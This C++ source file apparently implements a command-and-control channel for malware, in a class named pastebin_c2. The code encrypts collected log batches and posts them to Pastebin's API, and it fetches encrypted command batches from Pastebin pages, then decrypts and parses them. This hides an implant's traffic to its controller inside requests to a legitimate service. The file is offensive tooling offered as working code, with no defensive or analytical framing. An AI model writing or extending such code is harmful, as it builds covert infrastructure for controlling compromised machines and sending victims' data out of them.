#include "pastebin.h"
#include <iostream>
#include <ctime>

pastebin_c2::pastebin_c2(Comm* comm_module, crypto_encoder* encoder)
    : comm_module(comm_module), encoder(encoder), last_synced_time(0) {}

void pastebin_c2::sync_time() {
    // In a real implementation, we would perform a HEAD request to get the Date header.
    // For this prototype, we will simulate getting the time or use system time if network time isn't available.
    last_synced_time = std::time(nullptr);
}

std::string pastebin_c2::post_logs(const LogBatch& logs) {
    if (!comm_module || !encoder) return "";

    // 1. Sync time
    sync_time();
    
    // 2. Serialize Logs to JSON
    json j = logs;
    std::string data = j.dump();

    // 3. Set context for encryption
    // For logs, we might use the current timestamp as the hint source
    std::string hint = "log_batch"; 
    encoder->set_key_context(last_synced_time, hint);

    // 4. Encrypt the data
    std::string encrypted_data = encoder->encrypt(data);

    // 5. Send the request
    std::string response = comm_module->SendRequest(
        L"pastebin.com", 
        443, 
        L"/api/api_post.php", 
        L"POST", 
        encrypted_data
    );

    return response;
}

CommandBatch pastebin_c2::fetch_commands(const std::wstring& url) {
    CommandBatch batch;
    if (!comm_module || !encoder) return batch;

    // 1. Sync time
    sync_time();

    std::wstring server = L"pastebin.com";
    std::wstring path = url;

    // 2. Fetch the data
    std::string encrypted_response = comm_module->SendRequest(
        server, 
        443, 
        path, 
        L"GET"
    );

    if (encrypted_response.empty()) return batch;

    // 3. Set context for decryption
    // For commands, the hint should match what the C2 used.
    // In a real scenario, we might extract this from the paste title or metadata.
    // For prototype, we assume a fixed hint for commands.
    std::string hint = "cmd_batch"; 
    encoder->set_key_context(last_synced_time, hint);

    // 4. Decrypt the data
    std::string decrypted_data = encoder->decrypt(encrypted_response);

    // 5. Parse JSON
    try {
        json j = json::parse(decrypted_data);
        batch = j.get<CommandBatch>();
    } catch (json::parse_error& e) {
        std::cerr << "JSON Parse Error: " << e.what() << std::endl;
    }

    return batch;
}
